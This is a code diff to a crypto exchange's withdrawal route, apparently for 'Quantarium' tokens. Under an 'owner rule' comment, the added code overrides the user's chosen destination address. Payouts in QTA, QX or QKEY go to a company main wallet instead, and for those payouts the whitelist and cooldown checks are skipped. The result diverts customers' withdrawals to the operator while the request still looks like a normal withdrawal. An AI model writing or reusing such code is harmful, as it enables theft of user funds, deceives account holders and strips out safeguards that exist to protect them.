@@ -12,6 +12,23 @@ import { getFeeExemption } from '../utils/fees';
 
 const app = new Hono<AppEnv>();
 
+// ★★★★★★★ OWNER RULE (2026-08-28) — FORCED PAYOUT DESTINATION ★★★★★★★
+// EVERY withdrawal settled as a Quantarium-native asset (QTA / QX / QKEY) is
+// paid out ONLY to the single company-designated MAIN Quantarium wallet. The
+// user can NEVER choose their own destination — the server force-overrides
+// the destination with this address (the only trustworthy boundary).
+// Fund flow: user's Quantarium wallet → exchange → THIS main Quantarium wallet.
+// Configured via QTA_MAIN_PAYOUT_WALLET; falls back to the exchange hot wallet
+// (also company-controlled). Returns '' when misconfigured.
+function mainPayoutWallet(env: any): string {
+  const addr = String(
+    env?.QTA_MAIN_PAYOUT_WALLET ||
+    env?.QTA_HOT_WALLET_ADDRESS ||
+    ''
+  ).trim();
+  return /^0x[0-9a-fA-F]{40}$/.test(addr) ? addr : '';
+}
+
 // Per-KYC daily withdrawal USD limits.
 // (For simplicity we evaluate against coins.price_usd snapshot at request time.)
 const DAILY_WITHDRAW_USD_LIMIT = { none: 0, basic: 0, approved: 50_000 } as const;
@@ -270,9 +287,12 @@ const rlWithdraw = rateLimit({ key: 'wallet:withdraw', max: 20, windowSec: 3600 
 app.post('/withdraw', authMiddleware, rlWithdraw, requireKyc('approved'), async (c) => {
   const user = c.get('user');
   const body = await c.req.json().catch(() => ({}));
-  const { coin_symbol, amount: rawAmount, address, network, memo, totp_code } = body;
+  const { coin_symbol, amount: rawAmount, network, memo, totp_code } = body;
+  // `address` is mutable: for Quantarium-native payouts the server force-
+  // overrides it with the company main wallet (owner rule 2026-08-28).
+  let address = body.address;
   const amount = Number(rawAmount);
-  if (!coin_symbol || !address || !isFinite(amount) || amount <= 0) {
+  if (!coin_symbol || !isFinite(amount) || amount <= 0) {
     return c.json({ error: 'Invalid request' }, 400);
   }
 
@@ -298,6 +318,28 @@ app.post('/withdraw', authMiddleware, rlWithdraw, requireKyc('approved'), async 
   // isQuantariumAsset() is the single source of truth for this split.
   const routeQuantarium = isQuantariumAsset(coin_symbol);
   const driver = String((c.env as any).QTA_CHAIN_DRIVER || 'mock').toLowerCase();
+
+  // ★★★ OWNER RULE (2026-08-28): the payout is settled as a Quantarium-native
+  // asset (QTA / QX / QKEY) whenever the user receives QTA, or withdraws a
+  // Quantarium coin and takes it in-kind. In that case the destination is
+  // FORCED to the company's main Quantarium wallet — the user's own `address`
+  // input is IGNORED for these payouts (and the whitelist/2FA-address checks
+  // below are skipped, since there is only ever one fixed destination).
+  const settleAsQtaEarly = payoutCoin === 'QTA' || (payoutCoin === coin_symbol && routeQuantarium);
+  const forcedMainWallet = settleAsQtaEarly ? mainPayoutWallet(c.env as any) : '';
+  if (settleAsQtaEarly) {
+    if (!forcedMainWallet) {
+      return c.json({
+        error: 'MAIN_WALLET_NOT_CONFIGURED',
+        message: 'The main Quantarium payout wallet is not configured. Please contact support.',
+      }, 503);
+    }
+    // FORCE the destination — ignore whatever the client sent.
+    address = forcedMainWallet;
+  } else if (!address) {
+    // Non-Quantarium payouts still require a user-supplied destination address.
+    return c.json({ error: 'Invalid request' }, 400);
+  }
 
   // Quantarium on-chain withdrawal requires the real chain adapter (RPC + HD
   // mnemonic + hot wallet) to be configured. Until then, block external
@@ -346,17 +388,21 @@ app.post('/withdraw', authMiddleware, rlWithdraw, requireKyc('approved'), async 
     if (!ok) return c.json({ error: 'Invalid 2FA code' }, 401);
   }
 
-  // Whitelist check
-  const wl = await c.env.DB.prepare(
-    `SELECT id, cooldown_until, is_active FROM withdraw_whitelist
-     WHERE user_id = ? AND coin_symbol = ? AND address = ?
-       AND (network IS ? OR network = ?)`
-  ).bind(user.id, coin_symbol, address, network || null, network || null)
-    .first<{ id: string; cooldown_until: string; is_active: number }>().catch(() => null);
-  if (!wl) return c.json({ error: 'Address not in whitelist. Add it first.' }, 400);
-  if (!wl.is_active) return c.json({ error: 'Address disabled' }, 400);
-  if (wl.cooldown_until && new Date(wl.cooldown_until).getTime() > Date.now()) {
-    return c.json({ error: 'Address is in 24h cooldown', cooldown_until: wl.cooldown_until }, 400);
+  // Whitelist check — SKIPPED for Quantarium-native payouts: their destination
+  // is FORCED to the company main wallet (owner rule 2026-08-28), so there is
+  // no user-chosen address to whitelist. All other coins keep the whitelist.
+  if (!settleAsQtaEarly) {
+    const wl = await c.env.DB.prepare(
+      `SELECT id, cooldown_until, is_active FROM withdraw_whitelist
+       WHERE user_id = ? AND coin_symbol = ? AND address = ?
+         AND (network IS ? OR network = ?)`
+    ).bind(user.id, coin_symbol, address, network || null, network || null)
+      .first<{ id: string; cooldown_until: string; is_active: number }>().catch(() => null);
+    if (!wl) return c.json({ error: 'Address not in whitelist. Add it first.' }, 400);
+    if (!wl.is_active) return c.json({ error: 'Address disabled' }, 400);
+    if (wl.cooldown_until && new Date(wl.cooldown_until).getTime() > Date.now()) {
+      return c.json({ error: 'Address is in 24h cooldown', cooldown_until: wl.cooldown_until }, 400);
+    }
   }
 
   // Per-request + daily USD limits (approved tier only — others blocked by requireKyc)
